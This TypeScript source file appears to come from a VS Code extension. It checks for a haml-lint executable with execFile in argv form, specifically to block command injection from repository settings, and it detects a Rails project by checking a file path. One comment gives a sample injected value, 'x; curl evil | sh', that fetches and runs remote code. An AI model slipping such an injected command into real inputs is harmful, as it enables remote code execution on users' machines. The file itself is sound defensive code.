import { execFile } from 'node:child_process';
import { existsSync } from 'node:fs';
import * as path from 'node:path';
import { OutputChannel, workspace } from 'vscode';

import { SOURCE } from './linter';
import { getWorkspaceRoot } from './utils/file';

// Probes an executable by running `<executable> --version`.
//
// Uses execFile (argv form, no shell) instead of exec so that the executable
// path — which comes from workspace settings and can therefore be controlled
// by a repository's `.vscode/settings.json` — is never interpreted by a shell.
// This prevents command injection (e.g. "x; curl evil | sh"). It runs
// asynchronously so that probing a slow interpreter (a Ruby boot can take
// seconds) never blocks the extension host. A timeout guards against a probe
// that never returns.
function commandAvailable(executable: string): Promise<boolean> {
  return new Promise((resolve) => {
    execFile(executable, ['--version'], { timeout: 5000 }, (error) => {
      resolve(!error);
    });
  });
}

export function hamlLintPresent(): Promise<boolean> {
  const config = workspace.getConfiguration('hamlAll');
  const executable = config.linterExecutablePath || SOURCE;

  return commandAvailable(executable);
}

// Detects a Rails project by checking whether the rails command exists on disk,
// instead of spawning it. Booting `bin/rails` just to detect the project can
// take seconds (it may load Spring or part of the app) and, since this runs
// during activation, that delay would block the extension host. A relative
// command (the default `bin/rails`) is resolved against the workspace root; an
// absolute path is checked as-is.
export function isARailsProject(outputChanel: OutputChannel | null): boolean {
  const config = workspace.getConfiguration('railsRoutes');
  const railsCommand = config.railsCommand || 'bin/rails';

  const railsPath = path.isAbsolute(railsCommand) ? railsCommand : path.join(getWorkspaceRoot(), railsCommand);

  if (existsSync(railsPath)) {
    outputChanel?.appendLine('Rails project detected.');
    return true;
  }

  return false;
}
